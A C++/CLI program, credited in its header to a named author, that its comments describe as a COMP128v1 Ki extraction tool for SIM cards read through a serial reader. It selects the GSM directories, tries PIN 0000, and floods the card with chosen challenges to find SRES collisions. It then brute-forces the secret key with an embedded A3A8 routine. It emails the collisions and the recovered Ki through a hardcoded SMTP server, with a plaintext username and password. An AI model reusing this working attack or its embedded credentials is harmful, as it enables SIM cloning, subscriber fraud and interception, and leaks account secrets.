/*Com128v1 Ki extraction , written by Omar Atia Lebanon*/
/*You need SBS USB SIM reader/Writer from Radio shack that has serial port configuration in device manager when installing drivers....:)*/
/*You need to enable and disable RTS to get ATR, when choosing parity it should be even with baudrate 9600*/
/*Important note this design is for T=0 protocol , you can download free serial port monitor HDD free serial port monitor */
/**/
/**/


#using <System.dll>

using namespace System;
using namespace System::IO::Ports;
using namespace System::Threading;
using namespace System::Net::Mail;
using namespace System::Net;
//using namespace std;


#include <stdio.h>
#include <string.h>
#include <string>
#include <iostream>


#include <stdlib.h>

typedef unsigned char Byte1;

void A3A8(/* in */ Byte rand[16], /* in */ Byte key[16],
	/* out */ Byte simoutput[12]);

/* The compression tables. */
static const Byte table_0[512] = {
        102,177,186,162,  2,156,112, 75, 55, 25,  8, 12,251,193,246,188,
        109,213,151, 53, 42, 79,191,115,233,242,164,223,209,148,108,161,
        252, 37,244, 47, 64,211,  6,237,185,160,139,113, 76,138, 59, 70,
         67, 26, 13,157, 63,179,221, 30,214, 36,166, 69,152,124,207,116,
        247,194, 41, 84, 71,  1, 49, 14, 95, 35,169, 21, 96, 78,215,225,
        182,243, 28, 92,201,118,  4, 74,248,128, 17, 11,146,132,245, 48,
        149, 90,120, 39, 87,230,106,232,175, 19,126,190,202,141,137,176,
        250, 27,101, 40,219,227, 58, 20, 51,178, 98,216,140, 22, 32,121,
         61,103,203, 72, 29,110, 85,212,180,204,150,183, 15, 66,172,196,
         56,197,158,  0,100, 45,153,  7,144,222,163,167, 60,135,210,231,
        174,165, 38,249,224, 34,220,229,217,208,241, 68,206,189,125,255,
        239, 54,168, 89,123,122, 73,145,117,234,143, 99,129,200,192, 82,
        104,170,136,235, 93, 81,205,173,236, 94,105, 52, 46,228,198,  5,
         57,254, 97,155,142,133,199,171,187, 50, 65,181,127,107,147,226,
        184,218,131, 33, 77, 86, 31, 44, 88, 62,238, 18, 24, 43,154, 23,
         80,159,134,111,  9,114,  3, 91, 16,130, 83, 10,195,240,253,119,
        177,102,162,186,156,  2, 75,112, 25, 55, 12,  8,193,251,188,246,
        213,109, 53,151, 79, 42,115,191,242,233,223,164,148,209,161,108,
         37,252, 47,244,211, 64,237,  6,160,185,113,139,138, 76, 70, 59,
         26, 67,157, 13,179, 63, 30,221, 36,214, 69,166,124,152,116,207,
        194,247, 84, 41,  1, 71, 14, 49, 35, 95, 21,169, 78, 96,225,215,
        243,182, 92, 28,118,201, 74,  4,128,248, 11, 17,132,146, 48,245,
         90,149, 39,120,230, 87,232,106, 19,175,190,126,141,202,176,137,
         27,250, 40,101,227,219, 20, 58,178, 51,216, 98, 22,140,121, 32,
        103, 61, 72,203,110, 29,212, 85,204,180,183,150, 66, 15,196,172,
        197, 56,  0,158, 45,100,  7,153,222,144,167,163,135, 60,231,210,
        165,174,249, 38, 34,224,229,220,208,217, 68,241,189,206,255,125,
         54,239, 89,168,122,123,145, 73,234,117, 99,143,200,129, 82,192,
        170,104,235,136, 81, 93,173,205, 94,236, 52,105,228, 46,  5,198,
        254, 57,155, 97,133,142,171,199, 50,187,181, 65,107,127,226,147,
        218,184, 33,131, 86, 77, 44, 31, 62, 88, 18,238, 43, 24, 23,154,
        159, 80,111,134,114,  9, 91,  3,130, 16, 10, 83,240,195,119,253
    }, table_1[256] = {
         19, 11, 80,114, 43,  1, 69, 94, 39, 18,127,117, 97,  3, 85, 43,
         27,124, 70, 83, 47, 71, 63, 10, 47, 89, 79,  4, 14, 59, 11,  5,
         35,107,103, 68, 21, 86, 36, 91, 85,126, 32, 50,109, 94,120,  6,
         53, 79, 28, 45, 99, 95, 41, 34, 88, 68, 93, 55,110,125,105, 20,
         90, 80, 76, 96, 23, 60, 89, 64,121, 56, 14, 74,101,  8, 19, 78,
         76, 66,104, 46,111, 50, 32,  3, 39,  0, 58, 25, 92, 22, 18, 51,
         57, 65,119,116, 22,109,  7, 86, 59, 93, 62,110, 78, 99, 77, 67,
         12,113, 87, 98,102,  5, 88, 33, 38, 56, 23,  8, 75, 45, 13, 75,
         95, 63, 28, 49,123,120, 20,112, 44, 30, 15, 98,106,  2,103, 29,
         82,107, 42,124, 24, 30, 41, 16,108,100,117, 40, 73, 40,  7,114,
         82,115, 36,112, 12,102,100, 84, 92, 48, 72, 97,  9, 54, 55, 74,
        113,123, 17, 26, 53, 58,  4,  9, 69,122, 21,118, 42, 60, 27, 73,
        118,125, 34, 15, 65,115, 84, 64, 62, 81, 70,  1, 24,111,121, 83,
        104, 81, 49,127, 48,105, 31, 10,  6, 91, 87, 37, 16, 54,116,126,
         31, 38, 13,  0, 72,106, 77, 61, 26, 67, 46, 29, 96, 37, 61, 52,
        101, 17, 44,108, 71, 52, 66, 57, 33, 51, 25, 90,  2,119,122, 35
    }, table_2[128] = {
         52, 50, 44,  6, 21, 49, 41, 59, 39, 51, 25, 32, 51, 47, 52, 43,
         37,  4, 40, 34, 61, 12, 28,  4, 58, 23,  8, 15, 12, 22,  9, 18,
         55, 10, 33, 35, 50,  1, 43,  3, 57, 13, 62, 14,  7, 42, 44, 59,
         62, 57, 27,  6,  8, 31, 26, 54, 41, 22, 45, 20, 39,  3, 16, 56,
         48,  2, 21, 28, 36, 42, 60, 33, 34, 18,  0, 11, 24, 10, 17, 61,
         29, 14, 45, 26, 55, 46, 11, 17, 54, 46,  9, 24, 30, 60, 32,  0,
         20, 38,  2, 30, 58, 35,  1, 16, 56, 40, 23, 48, 13, 19, 19, 27,
         31, 53, 47, 38, 63, 15, 49,  5, 37, 53, 25, 36, 63, 29,  5,  7
    }, table_3[64] = {
          1,  5, 29,  6, 25,  1, 18, 23, 17, 19,  0,  9, 24, 25,  6, 31,
         28, 20, 24, 30,  4, 27,  3, 13, 15, 16, 14, 18,  4,  3,  8,  9,
         20,  0, 12, 26, 21,  8, 28,  2, 29,  2, 15,  7, 11, 22, 14, 10,
         17, 21, 12, 30, 26, 27, 16, 31, 11,  7, 13, 23, 10,  5, 22, 19
    }, table_4[32] = {
         15, 12, 10,  4,  1, 14, 11,  7,  5,  0, 14,  7,  1,  2, 13,  8,
         10,  3,  4,  9,  6,  0,  3,  2,  5,  6,  8,  9, 11, 13, 15, 12
    }, *table[5] = { table_0, table_1, table_2, table_3, table_4 };


int hextoint(char x)
{
//	x = toupper(x);
	if (x >= 'A' && x <= 'F')
		return x-'A'+10;
	else if (x >= '0' && x <= '9')
		return x-'0';
	fprintf(stderr, "bad input.\n");
//	exit(1);
}

public ref class PortChat
{
private:
    static bool _continue;
    static SerialPort^ _serialPort;

public:
    static void Main()
    {
			



        String^ name;
        String^ message;
        StringComparer^ stringComparer = StringComparer::OrdinalIgnoreCase;
        Thread^ readThread = gcnew Thread(gcnew ThreadStart(PortChat::Read));
			System::Net::Mail::MailMessage^ email=gcnew System::Net::Mail::MailMessage();
		char temp[100];
		char hash11[100];
	//	Stringstream^ ss;
	//	String^ s;
			int t,j,n,y,x,z,b,w,v,h,r,e,p;
			int i;
		

		
			email->To->Add(gcnew MailAddress("omar.atia@its.ws"));
			email->From = gcnew MailAddress("Ki@gmail.com");  
			email->Subject = "Ki extracting";
			strcat(hash11,"Ki extraction has been started");
//			String ws;
			String^ ws =gcnew String(hash11);
			memset(hash11,0x00,100);
			memset(temp,0x00,100);

//			ws=hash11;
	//		ws=hash11;

			//for(int i = 0; hash11[i] != 0; i++)
//			  ws += hash11[i];

		//	email->Body = "I'm going to try something";
			email->Body="Program has been started ::"+ws;
			SmtpClient client("mail.its.ws");
	//		SmtpClient client("smtp.mail.yahoo.com");
			client.Port::set(25); 

			client.EnableSsl = false; 
			
			
			client.UseDefaultCredentials = false; 
			CredentialCache ^ mycreds = gcnew CredentialCache();	
			mycreds->DefaultNetworkCredentials->UserName = "omar.atia";
			mycreds->DefaultNetworkCredentials->Password = "03001294"; 
			client.Credentials = mycreds;     

			//client.Credentials = login;
			try{	
			client.Send(email);
			}
			catch (Exception^ qt)
			{
				Console::WriteLine(qt->Message);
			}

			
		



        // Create a new SerialPort object with default settings.
        _serialPort = gcnew SerialPort();

        // Allow the user to set the appropriate properties.
        _serialPort->PortName = SetPortName(_serialPort->PortName);
        _serialPort->BaudRate = SetPortBaudRate(_serialPort->BaudRate);
        _serialPort->Parity = SetPortParity(_serialPort->Parity);
        _serialPort->DataBits = SetPortDataBits(_serialPort->DataBits);
        _serialPort->StopBits = SetPortStopBits(_serialPort->StopBits);
        _serialPort->Handshake = SetPortHandshake(_serialPort->Handshake);

//		printf("mambo italiano");
		
        // Set the read/write timeouts
        _serialPort->ReadTimeout = 500;
        _serialPort->WriteTimeout = 500;

        _serialPort->Open();
        //_continue = true;
		 //changing RTS for ATR (Answer to reset)           
						_serialPort->RtsEnable=true;
                        _serialPort->RtsEnable = false;
						

						Thread::Sleep(400);      

    int omar=_serialPort->BytesToRead;


    unsigned char test;

//read ATR	
	 for (int i = 0; i < omar; i++)
        test = (unsigned char)_serialPort->ReadByte();
	
	
	//    char[] atiato;
  //   unsigned char [7] intArray = gcnew unsigned char [7] {0xA0,0xA4,0x00,0x00,0x02,0x2F,0xE2};

	 array<unsigned char>^ intArray = gcnew array<unsigned char>(24) {0xA0,0xA4,0x00,0x00,0x02,0x3F,0x00}; //open folder 3F00

	 //select 6F 07

	 array<unsigned char>^ select = gcnew array<unsigned char>(24) {0xA0,0xA4,0x00,0x00,0x02,0x7F,0x20};//open folder 7F20
	
	 array<unsigned char>^ AuthComm = gcnew array<unsigned char>(24) {0xA0,0x88,0x00,0x00,0x10}; //Authuentication APDU

	 array<unsigned char>^ pinvarification = gcnew array<unsigned char>(24) {0xA0,0x20,0x00,0x01,0x08}; //PIN varification command
	
	array<unsigned char>^ pin = gcnew array<unsigned char>(24) {0x30,0x30,0x30,0x30,0xFF,0xFF,0xFF,0xFF}; //trying PIN 0000

	array<unsigned char>^ readSRES = gcnew array<unsigned char>(24) {0xA0,0xC0,0x00,0x00,0x0C};	//read SRES from SIM card 

	//A0 20 00 01 08

//	 FB 00 00 00 00 00 00 00 ED 00 00 00 00 00 00 00

	//testing random number for just testing 
	 array<unsigned char>^ randnum = gcnew array<unsigned char>(24) { 0xFB,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xED,0x00,0x00,0x00,0x00,0x00,0x00,0x00};

		Byte1 rand[16],rand1[16],rand2[16], key [16], hash1[12],hash2[12];
	Byte1 keycrack [16], simoutputcrack[12],chal1[16],chal2[16],output1[12],output2[12];

	//keycrack is the key which will be cracked ..
	// chal1 and chal2 are the collision challanges...
	// Byte1 are unsigned char...
//	Byte randhash[65536][28];
//	Byte1 **tango;

//	 A0 88 00 00 10

	//declare multi-dimensional array...

	 array<unsigned char,2>^ tango = gcnew array<unsigned char,2>(65536,28);


/*tango = (unsigned char **)malloc( 65536 * sizeof(int *));
	if(tango == NULL)
		{
		fprintf(stderr, "out of memory\n");
	//	return 0;
		}
	for(i = 0; i < 65536; i++)
		{
		tango[i] = (unsigned char *) malloc(28 * sizeof(unsigned char));
		if(tango[i] == NULL)
			{
			fprintf(stderr, "out of memory\n");
	//		 return -1;
			}
		}*/





//initialize keycrack to be 0x00...
for(i=0;i<16;i++)
keycrack[i]=0x00;
	
    

/*Open Folder 0x3F00*/   
        
	_serialPort->Write(intArray, 0, 1);

	int mha = _serialPort->BytesToRead;

	for (int i = 0; i < mha; i++)
        test = (unsigned char)_serialPort->ReadByte();


	_serialPort->Write(intArray, 1, 1);
	 int sisi = _serialPort->BytesToRead;

	for (int i = 0; i < sisi; i++)
        test = (unsigned char)_serialPort->ReadByte();

   _serialPort->Write(intArray, 2, 1);
 
   int tingo = _serialPort->BytesToRead;

	for (int i = 0; i < tingo; i++)
        test = (unsigned char)_serialPort->ReadByte();

   _serialPort->Write(intArray, 3, 1);
   int kokaie = _serialPort->BytesToRead;

	for (int i = 0; i < kokaie; i++)
        test = (unsigned char)_serialPort->ReadByte();

   _serialPort->Write(intArray, 4, 1);

  

   int iva = _serialPort->BytesToRead;

	for (int i = 0; i < iva; i++)
        test = (unsigned char)_serialPort->ReadByte();


	_serialPort->Write(intArray, 5, 1);

 int fifth = _serialPort->BytesToRead;

	for (int i = 0; i < fifth; i++)
        test = (unsigned char)_serialPort->ReadByte();


	_serialPort->Write(intArray, 6, 1);

	Thread::Sleep(100);

/*read 3F/////*/
   
  

   int zah = _serialPort->BytesToRead;

	for (int i = 0; i < zah; i++)
        test = (unsigned char)_serialPort->ReadByte();
	
//////////////////////////////////////////////////////////////////

/*open Select array which is folder 0x7F20*/
	_serialPort->Write(select, 0, 1);

	Thread::Sleep(20);
	int web = _serialPort->BytesToRead;

	for (int i = 0; i < web; i++)
        test = (unsigned char)_serialPort->ReadByte();


	_serialPort->Write(select, 1, 1);
	 int web1 = _serialPort->BytesToRead;
Thread::Sleep(20);
	
	 for (int i = 0; i < web1; i++)
        test = (unsigned char)_serialPort->ReadByte();

   _serialPort->Write(select, 2, 1);
 Thread::Sleep(20);

   int web2 = _serialPort->BytesToRead;

	for (int i = 0; i < web2; i++)
        test = (unsigned char)_serialPort->ReadByte();

   _serialPort->Write(select, 3, 1);
Thread::Sleep(20);  
   int web3 = _serialPort->BytesToRead;

	for (int i = 0; i < web3; i++)
        test = (unsigned char)_serialPort->ReadByte();

   _serialPort->Write(select, 4, 1);

  Thread::Sleep(20);

   int web4 = _serialPort->BytesToRead;

	for (int i = 0; i < web4; i++)
        test = (unsigned char)_serialPort->ReadByte();


	_serialPort->Write(select, 5, 1);
Thread::Sleep(20);

 int web5 = _serialPort->BytesToRead;

	for (int i = 0; i < web5; i++)
        test = (unsigned char)_serialPort->ReadByte();


	_serialPort->Write(select, 6, 1);

	Thread::Sleep(100);

/*read 0x7F20/////*/
   
  

   int web6 = _serialPort->BytesToRead;

	for (int i = 0; i < web6; i++)
        test = (unsigned char)_serialPort->ReadByte();
	











































/*PIN varificaions*/
	_serialPort->Write(pinvarification, 0, 1);
	_serialPort->Write(pinvarification, 1, 1);
	_serialPort->Write(pinvarification, 2, 1);
	_serialPort->Write(pinvarification, 3, 1);
	_serialPort->Write(pinvarification, 4, 1);

	Thread::Sleep(50); 

	int meme = _serialPort->BytesToRead;

	for (int i = 0; i < meme; i++)
        test = (unsigned char)_serialPort->ReadByte();

//write the PIN 0000

	_serialPort->Write(pin, 0, 1);
	_serialPort->Write(pin, 1, 1);
	_serialPort->Write(pin, 2, 1);
	_serialPort->Write(pin, 3, 1);
	_serialPort->Write(pin, 4, 1);
	_serialPort->Write(pin, 5, 1);
	_serialPort->Write(pin, 6, 1);
	_serialPort->Write(pin, 7, 1);

	Thread::Sleep(50); 

	int kiki = _serialPort->BytesToRead;

	for (int i = 0; i < kiki; i++)
        test = (unsigned char)_serialPort->ReadByte();


    
/*run GSM algorithm command for testing */

	_serialPort->Write(AuthComm, 0, 1);

	Thread::Sleep(50);

    int jug = _serialPort->BytesToRead;

    for (int i = 0; i < jug; i++)
        test = (unsigned char)_serialPort->ReadByte();

//    Console.Write("" + omar);

    

	_serialPort->Write(AuthComm, 1, 1);

	Thread::Sleep(50);

    int mon = _serialPort->BytesToRead;

    for (int i = 0; i < mon; i++)
        test = (unsigned char)_serialPort->ReadByte();



    _serialPort->Write(AuthComm, 2, 1);

    Thread::Sleep(50);

    int soso = _serialPort->BytesToRead;

    for (int i = 0; i < soso; i++)
        test = (unsigned char)_serialPort->ReadByte();

   // atiato[0] = 0x00;

    _serialPort->Write(AuthComm, 3, 1);

    Thread::Sleep(50);

    int donk = _serialPort->BytesToRead;

    for (int i = 0; i < donk; i++)
        test = (unsigned char)_serialPort->ReadByte();

 //   atiato[0] = 0x02;

    _serialPort->Write(AuthComm, 4, 1);

	Thread::Sleep(100);

    int zeb = _serialPort->BytesToRead;

    for (int i = 0; i < zeb; i++)
        test = (unsigned char)_serialPort->ReadByte();

 //   atiato[0] = 0x2F;

/* send the random number */
    _serialPort->Write(randnum, 0, 1);

  //  Thread.Sleep(50);

 /*   int ele = _serialPort->BytesToRead;

    for (int i = 0; i < ele; i++)
        test = (unsigned char)_serialPort->ReadByte();*/

//    atiato[0] = 0xE2;

    _serialPort->Write(randnum, 1, 1);
    
/*	Thread::Sleep(100);

    int fofo = _serialPort->BytesToRead;

    for (int i = 0; i < fofo; i++)
        test = (unsigned char)_serialPort->ReadByte();*/
	_serialPort->Write(randnum, 2, 1);
	_serialPort->Write(randnum, 3, 1);
	_serialPort->Write(randnum, 4, 1);
	_serialPort->Write(randnum, 5, 1);
	_serialPort->Write(randnum, 6, 1);
	_serialPort->Write(randnum, 7, 1);
	_serialPort->Write(randnum, 8, 1);
	_serialPort->Write(randnum, 9, 1);
	_serialPort->Write(randnum, 10, 1);
	_serialPort->Write(randnum, 11, 1);
	_serialPort->Write(randnum, 12, 1);
	_serialPort->Write(randnum, 13, 1);
	_serialPort->Write(randnum, 14, 1);
	_serialPort->Write(randnum, 15, 1);

    Thread::Sleep(200);

    int tito = _serialPort->BytesToRead;

    for (int i = 0; i < tito; i++)
        test = (unsigned char)_serialPort->ReadByte();
	


	_serialPort->Write(readSRES, 0, 1);
	_serialPort->Write(readSRES, 1, 1);
	_serialPort->Write(readSRES, 2, 1);
	_serialPort->Write(readSRES, 3, 1);
	_serialPort->Write(readSRES, 4, 1);
	
	Thread::Sleep(100);

    int mango = _serialPort->BytesToRead;

    for (int i = 0; i < mango; i++)
        test = (unsigned char)_serialPort->ReadByte();


//start Ki cracking...

	for (p=0;p<8;p++)
	{//to find coll. should varies 2 bytes 
j=0;		
	for(b=0;b<16;b++)
	{rand1[b]=0x00;
	rand2[b]=0x00;		
	}
		
		
					
					for (t=0;t<256;t++)
					{ if (j==11) break;
						for (n=0;n<256;n++)
						{	
							if(j==11)break;
						/*	rand2[i]=t;
							rand2[i+8]=n;*/
							for (i=0;i<15;i++)
								randnum[i]=0x00;

							randnum[p]=t;
							randnum[p+8]=n;

				//			PortChat::A3A8_crack(rand2,key,hash2);

							/*run GSM algorithm command*/

	_serialPort->Write(AuthComm, 0, 1);

/*	Thread::Sleep(20);

    int ll = _serialPort->BytesToRead;

    for (int i = 0; i < ll; i++)
        test = (unsigned char)_serialPort->ReadByte();*/

//    Console.Write("" + omar);

    

	_serialPort->Write(AuthComm, 1, 1);

/*	Thread::Sleep(20);

    int nn = _serialPort->BytesToRead;

    for (int i = 0; i < nn; i++)
        test = (unsigned char)_serialPort->ReadByte();*/



    _serialPort->Write(AuthComm, 2, 1);

  /*  Thread::Sleep(20);

    int ss = _serialPort->BytesToRead;

    for (int i = 0; i < ss; i++)
        test = (unsigned char)_serialPort->ReadByte();*/

   // atiato[0] = 0x00;

    _serialPort->Write(AuthComm, 3, 1);

 /*   Thread::Sleep(20);

    int dd = _serialPort->BytesToRead;

    for (int i = 0; i < dd; i++)
        test = (unsigned char)_serialPort->ReadByte();*/

 //   atiato[0] = 0x02;

    _serialPort->Write(AuthComm, 4, 1);

	Thread::Sleep(35);

    int rr = _serialPort->BytesToRead;

    for (int i = 0; i < rr; i++)
        test = (unsigned char)_serialPort->ReadByte();

 //   atiato[0] = 0x2F;

/* send the random number */
    _serialPort->Write(randnum, 0, 1);

  //  Thread.Sleep(50);

 /*   int ele = _serialPort->BytesToRead;

    for (int i = 0; i < ele; i++)
        test = (unsigned char)_serialPort->ReadByte();*/

//    atiato[0] = 0xE2;

    _serialPort->Write(randnum, 1, 1);
    
/*	Thread::Sleep(100);

    int fofo = _serialPort->BytesToRead;

    for (int i = 0; i < fofo; i++)
        test = (unsigned char)_serialPort->ReadByte();*/
	_serialPort->Write(randnum, 2, 1);
	_serialPort->Write(randnum, 3, 1);
	_serialPort->Write(randnum, 4, 1);
	_serialPort->Write(randnum, 5, 1);
	_serialPort->Write(randnum, 6, 1);
	_serialPort->Write(randnum, 7, 1);
	_serialPort->Write(randnum, 8, 1);
	_serialPort->Write(randnum, 9, 1);
	_serialPort->Write(randnum, 10, 1);
	_serialPort->Write(randnum, 11, 1);
	_serialPort->Write(randnum, 12, 1);
	_serialPort->Write(randnum, 13, 1);
	_serialPort->Write(randnum, 14, 1);
	_serialPort->Write(randnum, 15, 1);

    Thread::Sleep(50);

    int tt = _serialPort->BytesToRead;

    for (int i = 0; i < tt; i++)
        test = (unsigned char)_serialPort->ReadByte();
	


	_serialPort->Write(readSRES, 0, 1);
	_serialPort->Write(readSRES, 1, 1);
	_serialPort->Write(readSRES, 2, 1);
	_serialPort->Write(readSRES, 3, 1);
	_serialPort->Write(readSRES, 4, 1);
	
	Thread::Sleep(30);

    int handm = _serialPort->BytesToRead;
	
	unsigned char sondos[30];

	for (i=0;i<30;i++)
		sondos[i]=0x00;

    for (int i = 0; i < handm; i++)
	{
        test = (unsigned char)_serialPort->ReadByte();
		sondos[i]=test;
	}

	unsigned char kokoo[12];
	int u=0;

	for (i=6;i<18;i++)
	{	
		kokoo[u]=sondos[i];
		u++;
	}

														
							for (b=0;b<16;b++)
								tango[(256*t)+n,b]=randnum[b];
							for (b=0;b<12;b++)
								tango[(256*t)+n,b+16]=kokoo[b];

							printf("t=%d , n=%d",t,n);
										printf("\b");//backspaces on char
										printf("\r");//return to beginning of line

						if(n>=255 && (256*t+n)>16384)
						{
							for(x=0;x<((256*t)+n);x++)	
							{
								if (j==11)
								break;
								for(w=0;w<((256*t)+n);w++)
								{
									if (j==11)break;

								j=0;

						
								if(x!=w){
							while(1)
									{
									
										if (tango[x,j+16]!=tango[w,j+16] && j!=11 )
											{
																							
										//		printf("not equal\n");
												break;
											} else
												j++;
								
					
										if (j==11) {
											e=0;
											printf ("\n \found collision \n");
												printf("randhash1: ");
													for (z=0; z<28; z++)
													{		sprintf(temp,"%02X",tango[x,z]);
															printf("%02X", tango[x,z]);
															strcat(hash11,temp);
													}
													
														String^ str =gcnew String(hash11);

												//	String^ string1(hash11);

													email->Body="Collision::"+str;
												try{	
												client.Send(email);
													}
												catch (Exception^ qt)
													{
												Console::WriteLine(qt->Message);
													}
//													temp='\0';
//													hash11='\0';
													memset(temp,0x00,100);
													memset(hash11,0x00,100);
											printf("\n");
											printf("randhash2: ");
											for (z=0; z<28; z++)
													{
											sprintf(temp,"%02X",tango[w,z]);
											printf("%02X", tango[w,z]);
													strcat(hash11,temp);
													}
													String^ str1 =gcnew String(hash11);
													email->Body="Collision2::"+str1;
													try{	
													client.Send(email);
														}
												catch (Exception^ qt)
													{
												Console::WriteLine(qt->Message);
													}
													memset(temp,0x00,100);
													memset(hash11,0x00,100);
													printf("\n");
											printf("\n");
											for(v=0;v<16;v++)
												chal1[v]=tango[x,v];
											for(v=0;v<16;v++)
												chal2[v]=tango[w,v];
											for (h=0;h<256;h++)
											{	if (e==11) break;
												for (r=0;r<256;r++)
												{
													if(e==11) break;
												keycrack[p]=h;
												keycrack[p+8]=r;
												//run software alogrithm to find each double bytes of keycrack//
														A3A8_crack(chal1,keycrack,output1);
														A3A8_crack(chal2,keycrack,output2);
														e=0;

														while(1)
									{
									if (output1[e]!=output2[e] && e!=11)
											{
												for (b=0;b<12;b++)
													{
												
												output1[b]=0x00;
												output2[b]=0x00;
													}
																							
										//		printf("not equal\n");
												break;
											} else
												e++;
		
										if (e==11) {
											printf ("Found Ki \n");
												printf("Key1: ");
													for (z=0; z<16; z++)
													{
											sprintf(temp,"%02X",keycrack[z]);
											
													strcat(hash11,temp);
											printf("%02X", keycrack[z]);
													}

													String^ str2 =gcnew String(hash11);

											printf("\n");
											email->Body="Ki::"+str2;
												try{	
													client.Send(email);
														}
												catch (Exception^ qt)
													{
												Console::WriteLine(qt->Message);
													}
											memset(temp,0x00,100);
													memset(hash11,0x00,100);

										//	getch();				
											break;
				
													}
		

									}








												}
											}


											
											
	
											break;
				
													}
		

									}
										
								}
								
							
							}
						}

						}

					}
					}
 }



















/*To Do Next read the SRES and Kc response*/	
	






	/*   readThread->Start();

        Console::Write("Name: ");
        name = Console::ReadLine();

        Console::WriteLine("Type QUIT to exit");

        while (_continue)
        {
            message = Console::ReadLine();

            if (stringComparer->Equals("quit", message))
            {
                _continue = false;
            }
            else
            {
                _serialPort->WriteLine(
                    String::Format("<{0}>: {1}", name, message) );
            }
        }

        readThread->Join();*/
        _serialPort->Close();
    }




    static void Read()
    {
        while (_continue)
        {
            try
            {
                String^ message = _serialPort->ReadLine();
                Console::WriteLine(message);
            }
            catch (TimeoutException ^) { }
        }
    }

    static String^ SetPortName(String^ defaultPortName)
    {
        String^ portName;

        Console::WriteLine("Available Ports:");
        for each (String^ s in SerialPort::GetPortNames())
        {
            Console::WriteLine("   {0}", s);
        }

        Console::Write("COM port({0}): ", defaultPortName);
        portName = Console::ReadLine();

        if (portName == "")
        {
            portName = defaultPortName;
        }
        return portName;
    }

    static Int32 SetPortBaudRate(Int32 defaultPortBaudRate)
    {
        String^ baudRate;

        Console::Write("Baud Rate({0}): ", defaultPortBaudRate);
        baudRate = Console::ReadLine();

        if (baudRate == "")
        {
            baudRate = defaultPortBaudRate.ToString();
        }

        return Int32::Parse(baudRate);
    }

    static Parity SetPortParity(Parity defaultPortParity)
    {
        String^ parity;

        Console::WriteLine("Available Parity options:");
        for each (String^ s in Enum::GetNames(Parity::typeid))
        {
            Console::WriteLine("   {0}", s);
        }

        Console::Write("Parity({0}):", defaultPortParity.ToString());
        parity = Console::ReadLine();

        if (parity == "")
        {
            parity = defaultPortParity.ToString();
        }

        return (Parity)Enum::Parse(Parity::typeid, parity);
    }

    static Int32 SetPortDataBits(Int32 defaultPortDataBits)
    {
        String^ dataBits;

        Console::Write("Data Bits({0}): ", defaultPortDataBits);
        dataBits = Console::ReadLine();

        if (dataBits == "")
        {
            dataBits = defaultPortDataBits.ToString();
        }

        return Int32::Parse(dataBits);
    }

    static StopBits SetPortStopBits(StopBits defaultPortStopBits)
    {
        String^ stopBits;

        Console::WriteLine("Available Stop Bits options:");
        for each (String^ s in Enum::GetNames(StopBits::typeid))
        {
            Console::WriteLine("   {0}", s);
        }

        Console::Write("Stop Bits({0}):", defaultPortStopBits.ToString());
        stopBits = Console::ReadLine();

        if (stopBits == "")
        {
            stopBits = defaultPortStopBits.ToString();
        }

        return (StopBits)Enum::Parse(StopBits::typeid, stopBits);
    }

    static Handshake SetPortHandshake(Handshake defaultPortHandshake)
    {
        String^ handshake;

        Console::WriteLine("Available Handshake options:");
        for each (String^ s in Enum::GetNames(Handshake::typeid))
        {
            Console::WriteLine("   {0}", s);
        }

        Console::Write("Handshake({0}):", defaultPortHandshake.ToString());
        handshake = Console::ReadLine();

        if (handshake == "")
        {
            handshake = defaultPortHandshake.ToString();
        }

        return (Handshake)Enum::Parse(Handshake::typeid, handshake);
    }

static	void A3A8_crack(/* in */ Byte1 rand[16], /* in */ Byte1 key[16],
	/* out */ Byte1 simoutput[12])
{
	Byte1 x[32], bit[128];
	int i, j, k, l, m, n, y, z, next_bit;

	/* ( Load RAND into last 16 bytes of input ) */
	for (i=16; i<32; i++)
		x[i] = rand[i-16];

	/* ( Loop eight times ) */
	for (i=1; i<9; i++) {
		/* ( Load key into first 16 bytes of input ) */
		for (j=0; j<16; j++)
			x[j] = key[j];
		/* ( Perform substitutions ) */
		for (j=0; j<5; j++)
			for (k=0; k<(1<<j); k++)
				for (l=0; l<(1<<(4-j)); l++) {
					m = l + k*(1<<(5-j));
					n = m + (1<<(4-j));
					y = (x[m]+2*x[n]) % (1<<(9-j));
					z = (2*x[m]+x[n]) % (1<<(9-j));
					x[m] = table[j][y];
					x[n] = table[j][z];
				}
		/* ( Form bits from bytes ) */
		for (j=0; j<32; j++)
			for (k=0; k<4; k++)
				bit[4*j+k] = (x[j]>>(3-k)) & 1;
		/* ( Permutation but not on the last loop ) */
		if (i < 8)
			for (j=0; j<16; j++) {
				x[j+16] = 0;
				for (k=0; k<8; k++) {
					next_bit = ((8*j + k)*17) % 128;
					x[j+16] |= bit[next_bit] << (7-k);
				}
			}
	}

	/*
	 * ( At this stage the vector x[] consists of 32 nibbles.
	 *   The first 8 of these are taken as the output SRES. )
	 */

	/* The remainder of the code is not given explicitly in the
	 * standard, but was derived by reverse-engineering.
	 */

	for (i=0; i<4; i++)
		simoutput[i] = (x[2*i]<<4) | x[2*i+1];
	for (i=0; i<6; i++)
		simoutput[4+i] = (x[2*i+18]<<6) | (x[2*i+18+1]<<2)
				| (x[2*i+18+2]>>2);
	simoutput[4+6] = (x[2*6+18]<<6) | (x[2*6+18+1]<<2);
	simoutput[4+7] = 0;
}


};

int main()
{
    PortChat::Main();
}
